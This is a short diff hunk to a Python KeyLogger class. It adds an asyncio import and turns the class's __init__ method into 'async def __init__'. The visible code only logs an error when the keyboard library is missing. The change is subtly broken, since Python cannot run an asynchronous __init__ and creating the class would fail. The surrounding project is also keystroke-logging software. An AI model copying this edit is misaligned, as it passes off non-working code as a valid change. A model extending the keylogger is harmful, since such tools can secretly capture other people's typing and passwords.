@@ -5,10 +5,10 @@ except ImportError:
     keyboard = False
 from multiprocessing import process
 import logging
-
+import asyncio
 
 class KeyLogger:
-    def __init__(self):
+    async def __init__(self):
         if not keyboard:
             self.logger = logging.getLogger("logger.main")
             self.logger.error("Envrionment errors, unable to start keylogger")
